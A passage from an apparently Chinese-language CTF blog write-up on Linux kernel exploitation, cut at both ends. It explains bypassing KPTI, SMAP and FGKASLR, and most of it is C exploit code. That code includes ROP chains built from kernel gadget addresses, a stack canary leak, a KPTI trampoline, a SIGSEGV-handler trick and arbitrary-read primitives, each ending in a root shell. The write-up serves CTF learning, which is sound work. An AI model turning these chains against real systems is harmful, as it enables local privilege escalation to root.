p[off++] = user_sp;</span><br><span class="line">  p[off++] = user_ss;</span><br><span class="line">  Done(<span class="string">&quot;StackPivot&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  open_dev();</span><br><span class="line">  <span class="comment">// getOpAddr();</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>];</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">  wtk(buf, <span class="number">0x80</span>);</span><br><span class="line">  rfk(store,<span class="number">0x90</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Dbg(<span class="string">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class="line">  Info(<span class="string">&quot;canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  u64 canary = ptr[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// wtk(buf, 0x10);</span></span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  <span class="type">int</span> off = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">  saveState();</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = mov_esp_pop2_ret;</span><br><span class="line">  StackPivot(canary);</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="增加kpti"><a class="markdownIt-Anchor" href="#增加kpti">#</a> 增加 KPTI</h1><p>KPTI 在文章里写的很清楚 在用户态只能用 userland 的页表和 minimal 的内核页表了<br>本人没找到较好的说明文章，我觉得是这个 minimal 中只包含 <code>swapgs_restore_regs_and_return_to_usermode</code>  这个 gadget 了，<br>而不包含之前的 <code>swapgs_pop1_ret</code> .<br> 也就是没法实现类似 函数调用一样的用户列表切换到内核区域去执行和某些 ROP 的情况了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">  (* (<span class="type">int</span> *(*)(<span class="type">void</span> *))cc)((* (<span class="type">void</span> *(*)(<span class="type">void</span> *))pkc)(<span class="literal">NULL</span>));</span><br><span class="line">  ret2usr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作者提到了两种办法 此外还有一种格外的方法</p><ul><li>一种是用 <code>signal handler</code>  去 hook 掉这个 <code>SIGSEGV</code>  信号 在 signal 里面进行内核函数的执行却不会触发</li><li>另外的是 <code>KPTI trampoline</code>  也就是复用内核中交换页表的 gadget 再次换回来（gs 寄存器控制内核页表）</li><li>用控制 cr3 的 gadgets 去 把 cr3 或上 0x1000<br> 内核态的页表是全的 用户态页表才是残缺的</li></ul><p>也就是之前学过的这个 gadgets 不过这里略微不同 对于开了 kpti 的程序是这样的（至于为什么会不用原先的，我也没弄明白，<br> 因为我实际调试的时候发现 cr3 没变）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">-&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">   <span class="number">0xffffffff81200f26</span>:  mov    rdi,rsp                      [<span class="number">1</span>] &lt;&lt;- 先把rsp给到rdi</span><br><span class="line">   <span class="number">0xffffffff81200f29</span>:  mov    rsp,QWORD PTR gs:<span class="number">0x6004</span>      [<span class="number">2</span>] &lt;&lt;- 然后复制新的rsp push都在新rsp上</span><br><span class="line">   <span class="number">0xffffffff81200f32</span>:  push   QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0xffffffff81200f35</span>:  push   QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0xffffffff81200f38</span>:  push   QWORD PTR [rdi+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0xffffffff81200f3b</span>:  push   QWORD PTR [rdi+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0xffffffff81200f3e</span>:  push   QWORD PTR [rdi+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xffffffff81200f41</span>:  push   QWORD PTR [rdi]              [<span class="number">3</span>] &lt;&lt;- 原先rsp的内容在栈上</span><br><span class="line">   <span class="number">0xffffffff81200f43</span>:  push   rax</span><br><span class="line">   <span class="number">0xffffffff81200f44</span>:  jmp    <span class="number">0xffffffff81200f89</span></span><br><span class="line"></span><br><span class="line">   (···)</span><br><span class="line"></span><br><span class="line">   <span class="number">0xffffffff81200f89</span>:  pop    rax                          [<span class="number">4</span>] &lt;&lt;- rax就是原先push的rax 没有变化</span><br><span class="line">   <span class="number">0xffffffff81200f8a</span>:  pop    rdi                          [<span class="number">5</span>] &lt;&lt;- rsp为之前rsp的解引用了</span><br><span class="line">   <span class="number">0xffffffff81200f8b</span>:  swapgs </span><br><span class="line">   <span class="number">0xffffffff81200f8e</span>:  data16 xchg ax,ax</span><br><span class="line">   <span class="number">0xffffffff81200f91</span>:  jmp    <span class="number">0xffffffff81200fc0</span></span><br><span class="line"></span><br><span class="line">(···)</span><br><span class="line"></span><br><span class="line">   <span class="number">0xffffffff81200fc0</span>:  test   BYTE PTR [rsp+<span class="number">0x20</span>],<span class="number">0x4</span></span><br><span class="line">   <span class="number">0xffffffff81200fc5</span>:  jne    <span class="number">0xffffffff81200fc9</span></span><br><span class="line">   <span class="number">0xffffffff81200fc7</span>:  iretq</span><br></pre></td></tr></table></figure><p>这里作者解释错了 对于 <code>swapgs_restore_regs_and_return_to_usermode</code>  真正给出两个 dummy 的并不是两个 pop,<br> 这里压入 6 个寄存器，而只弹出了两个然后剩下的 <code>[rdi+0x10]</code>  开始才是真的 <code>rip|cs|rflag|sp|ss</code> , 所以当 rsp 指向如下位置的时候，<br> <code>rsp+0x10</code>  正是 rip 的位置，这两个 0dummy 是占位，并不是所说的两个 pop。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload[off++] = kpti_trampoline;</span><br><span class="line">payload[off++] = <span class="number">0</span>;                  &lt;- rsp </span><br><span class="line">payload[off++] = <span class="number">0</span>;                   </span><br><span class="line">payload[off++] = ret;</span><br><span class="line">payload[off++] = user_cs;</span><br><span class="line">payload[off++] = user_rflags;</span><br><span class="line">payload[off++] = user_sp;</span><br><span class="line">payload[off++] = user_ss;</span><br></pre></td></tr></table></figure><p>[[swapgs_restore_regs_and_return_to_usermode]]</p><p>用户态进入内核态会调用 <code>SWITCH_KERNEL_CR3_NO_STACK</code>  从用户态切换到内核态<br>也就是清零 12 位和 13 位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">and     rdi, <span class="number">0xFFFFFFFFFFFFE7FF</span></span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><p>而在从内核态返回用户态时会调用  <code>SWITCH_USER_CR3</code>  宏来切换  <code>CR3</code> ，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdi, cr3</span><br><span class="line">or      rdi, <span class="number">1000</span>h</span><br><span class="line">mov     cr3, rdi</span><br></pre></td></tr></table></figure><h2 id="exp1-trampoline"><a class="markdownIt-Anchor" href="#exp1-trampoline">#</a> exp1 - trampoline</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">u64 kernel_base              = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">u64 pop_rdx_ret              = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line">u64 cmp_rdx_jne_pop2_ret     = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">u64 mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">u64 pop_rdi_ret              = <span class="number">0xffffffff81006370</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">u64 swapgs_pop1_ret          = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// not found </span></span><br><span class="line">u64 iretq                    = <span class="number">0xffffffff8100c0d9</span>; <span class="comment">// iretq</span></span><br><span class="line">u64 mov_esp_pop2_ret         = <span class="number">0xffffffff8196f56a</span>; <span class="comment">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line">u64 kpti_trampoline          = <span class="number">0xffffffff81200f10</span>+<span class="number">22</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  open_dev();</span><br><span class="line">  <span class="comment">// getOpAddr();</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>];</span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">  wtk(buf, <span class="number">0x80</span>);</span><br><span class="line">  rfk(store,<span class="number">0x90</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Dbg(<span class="string">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class="line">  Info(<span class="string">&quot;canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  u64 canary = ptr[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// wtk(buf, 0x10);</span></span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  <span class="type">int</span> off = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">  saveState();</span><br><span class="line">  Info(<span class="string">&quot;Bypass kpti&quot;</span>);</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rdi_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = pkc;</span><br><span class="line">  payload[off++] = pop_rdx_ret;</span><br><span class="line">  payload[off++] = <span class="number">8</span>;</span><br><span class="line">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class="comment">// make test branch not reach</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = cc;</span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>; <span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>; <span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = getShell;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  <span class="comment">// StackPivot(canary);</span></span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp2-signal-sigsegv"><a class="markdownIt-Anchor" href="#exp2-signal-sigsegv">#</a> exp2 - signal SIGSEGV</h2><p>在开启 KPTI 内核，提权返回到用户态（iretq/sysret）之前如果不设置 CR3 寄存器的值，<br>就会导致进程找不到当前程序的正确页表，引发段错误，程序退出。<br>不过可以用 signal hook 掉这个信号 实现 getshell。<br>其实只是简单的在普通没开 KPTI 的 <code>swapgs/iretq</code>  的基础上加一行 <code>signal(SIGSEGV, getShell);</code>  即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    Info(<span class="string">&quot;get shell now&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    Panic(<span class="string">&quot;getShell failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  signal(SIGSEGV, getShell);</span><br><span class="line">  open_dev();</span><br><span class="line">  <span class="comment">// getOpAddr();</span></span><br><span class="line">  <span class="type">char</span> store[<span class="number">0x100</span>];</span><br><span class="line">  rfk(store,<span class="number">0x90</span>);</span><br><span class="line">  u64 *ptr = store;</span><br><span class="line">  Dbg(<span class="string">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class="line">  Info(<span class="string">&quot;canary is 0x%lx&quot;</span>, ptr[<span class="number">2</span>]);</span><br><span class="line">  u64 canary = ptr[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// wtk(buf, 0x10);</span></span><br><span class="line">  u64 payload[<span class="number">50</span>];</span><br><span class="line">  <span class="type">int</span> off = <span class="number">16</span>;</span><br><span class="line">  u64 kernel_base              = <span class="number">0xffffffff80000000</span>;</span><br><span class="line">  u64 pop_rdx_ret              = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line">  u64 cmp_rdx_jne_pop2_ret     = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">  u64 mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line">  u64 pop_rdi_ret              = <span class="number">0xffffffff81006370</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line">  u64 swapgs_pop1_ret          = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// not found </span></span><br><span class="line">  u64 iretq                    = <span class="number">0xffffffff8100c0d9</span>; <span class="comment">// iretq</span></span><br><span class="line">  saveState();</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rdi_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = pkc;</span><br><span class="line">  payload[off++] = pop_rdx_ret;</span><br><span class="line">  payload[off++] = <span class="number">8</span>;</span><br><span class="line">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class="comment">// make test branch not reach</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = cc;</span><br><span class="line">  payload[off++] = swapgs_pop1_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;</span><br><span class="line">  payload[off++] = iretq;</span><br><span class="line">  payload[off++] = getShell;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="增加smap"><a class="markdownIt-Anchor" href="#增加smap">#</a> 增加 SMAP</h1><p><strong>Supervisor Mode Access Prevention</strong><br>marks all the userland pages in the page table as non-accessible when the process is in kernel-mode，<br>by setting the  <code>21st bit</code>  of Control Register  <code>CR4</code> .</p><p>对用户态的一切读写都将失效，<br>对 ROP 依旧也用，但是栈迁移不行了</p><h1 id="再加上kaslr保护开满"><a class="markdownIt-Anchor" href="#再加上kaslr保护开满">#</a> 再加上 KASLR 保护开满</h1><p>其实我觉得就多泄漏一个 base 之外和之前的 ROP 没啥区别了，不过事情没我想的这么简单<br>这里其实还有个保护 叫做 <code>Function Granular KASLR</code>  会打乱函数到内核基址的偏移，也就是上面遇到的 rearrange<br><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/">FGKASLR - CTF Wiki</a><br> 根据 wiki 和文章 可以得知</p><ul><li>__ksymtab 不会参与随机化</li><li>.data 不会参与随机化</li><li>The functions from  <code>_text</code>  base to  <code>__x86_retpoline_r15</code> , which is  <code>_text+0x400dc6</code>  are unaffected.<br> 这个段落包括</li><li>swapgs_restore_regs_and_return_to_usermode，该部分的代码可以帮助我们绕过 KPTI 防护</li><li>memcpy 内存拷贝</li><li>sync_regs，可以把 RAX 放到 RDI 中</li></ul><p>不会参与随机化的部分 有以下的 gadgets</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">u64 pop_rax_ret = kernel_base + <span class="number">0x4d11</span>; <span class="comment">// pop rax; ret</span></span><br><span class="line">u64 read_mem_pop1_ret = kernel_base + <span class="number">0x4aae</span>; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line">u64 pop_rdi_rbp_ret = kernel_base + <span class="number">0x38a0</span>; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br></pre></td></tr></table></figure><p>1 和 2 的 gadget 构成了任意地址读写的 primitive<br> 对于 <code>kernel_table</code> , 就是 <code>ksymtab</code>  里的每一项，这个到内核基址是固定的。<br>他记录的符号表的偏移（通过 ksymtab 看到的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> value_offset;    [<span class="number">1</span>] &lt;&lt;- 真正有用的</span><br><span class="line">  <span class="type">int</span> name_offset;</span><br><span class="line">  <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>sync_regs 如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff8100aec0</span>:  push   rbp</span><br><span class="line"><span class="number">0xffffffff8100aec1</span>:  mov    rbp,rsp</span><br><span class="line"><span class="number">0xffffffff8100aec4</span>:  mov    rax,QWORD PTR gs:[rip+<span class="number">0x7effb140</span>]        # <span class="number">0x600c</span></span><br><span class="line"><span class="number">0xffffffff8100aecc</span>:  sub    rax,<span class="number">0xa8</span></span><br><span class="line"><span class="number">0xffffffff8100aed2</span>:  cmp    rax,rdi</span><br><span class="line"><span class="number">0xffffffff8100aed5</span>:  je     <span class="number">0xffffffff8100aee5</span></span><br><span class="line"><span class="number">0xffffffff8100aed7</span>:  mov    rsi,rdi</span><br><span class="line"><span class="number">0xffffffff8100aeda</span>:  mov    ecx,<span class="number">0x15</span></span><br><span class="line"><span class="number">0xffffffff8100aedf</span>:  mov    rdi,rax                                     [<span class="number">1</span>] &lt;&lt;- 个人觉得从这里开始比较好</span><br><span class="line"><span class="number">0xffffffff8100aee2</span>:  rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]</span><br><span class="line"><span class="number">0xffffffff8100aee5</span>:  pop    rbp</span><br><span class="line"><span class="number">0xffffffff8100aee6</span>:  ret </span><br></pre></td></tr></table></figure><p>通过不断的调整位置 打印寻找 终于找到了合适的地址 leak</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./exp </span><br><span class="line">[+] saveState done</span><br><span class="line">[+] open_dev() done</span><br><span class="line">[*] rfk start</span><br><span class="line">[+] rfk done</span><br><span class="line">[*] canary is <span class="number">0x9292ebeb2e24af00</span></span><br><span class="line">p[<span class="number">1</span>] : <span class="number">0x19</span></span><br><span class="line">p[<span class="number">10</span>] : <span class="number">0xffffffff8184e047</span></span><br><span class="line">p[<span class="number">11</span>] : <span class="number">0xffffffff8184e047</span></span><br><span class="line">p[<span class="number">20</span>] : <span class="number">0xffffffff816d51ff</span></span><br><span class="line">p[<span class="number">27</span>] : <span class="number">0xffffffff816d5727</span></span><br><span class="line">p[<span class="number">28</span>] : <span class="number">0xffffffff8152b8a1</span></span><br><span class="line">p[<span class="number">38</span>] : <span class="number">0xffffffff8100a157</span>   &lt;&lt;- 这逼东西</span><br><span class="line">p[<span class="number">51</span>] : <span class="number">0x19</span></span><br><span class="line">p[<span class="number">56</span>] : <span class="number">0x3</span></span><br><span class="line">p[<span class="number">59</span>] : <span class="number">0x33</span></span><br></pre></td></tr></table></figure><p>这里构造了两个原语 一个实现任意地址读写的原语 一个实现了 f (x) 的函数调用的原语，<br>分别是用来读取 <code>ksymtab</code>  和实现 <code>cc(pkc)</code>  的。</p><h2 id="两个原语"><a class="markdownIt-Anchor" href="#两个原语">#</a> 两个原语</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">read_from_addr_primitive</span><span class="params">(<span class="type">char</span> *addr, <span class="type">void</span> (*f)())</span>&#123;</span><br><span class="line">  u64 payload[<span class="number">0x40</span>];</span><br><span class="line">  u64 off = <span class="number">16</span>;</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// r12</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbp</span></span><br><span class="line">  payload[off++] = pop_rax_ret;</span><br><span class="line">  payload[off++] = addr - <span class="number">0x10</span>;</span><br><span class="line">  payload[off++] = read_mem_pop1_ret;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy</span></span><br><span class="line">  payload[off++] = kpti_trampoline;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rax</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// dummy rdi</span></span><br><span class="line">  payload[off++] = f;</span><br><span class="line">  payload[off++] = user_cs;</span><br><span class="line">  payload[off++] = user_rflags;</span><br><span class="line">  payload[off++] = user_sp;</span><br><span class="line">  payload[off++] = user_ss;</span><br><span class="line">  wtk(payload, off * <span class="number">8</span>);</span><br><span class="line">  Done(<span class="string">&quot;read_from_addr_primitive&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将 rax 作为指定内存读出来的地址，也就是 <code>kernel_symbol</code>  中的 <code>value_offset</code>  值，<br>然后和对应的 <code>__ksymtab_symname</code>  的地址加起来就是我们要的最终函数的偏移。<br>由于是 rip 直接切换为 f 没有在栈上留下返回地址 所以这个是不能返回的 也就是 Done 这个函数压根执行不到。<br>所以只能层层递归套娃。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fn_rdi_ret_primitive</span><span class="params">(<span class="type">void</span> (*fn)(), u64 rdi, <span class="type">void</span> (*ret)())</span>&#123;</span><br><span class="line">  u64 payload[<span class="number">0x40</span>];</span><br><span class="line">  u64 off = <span class="number">16</span>;</span><br><span class="line">  payload[off++] = canary;</span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span class="comment">// rbx</span></span><br><span class="line">  payload[off++] = <span class="number">0</span>;<span 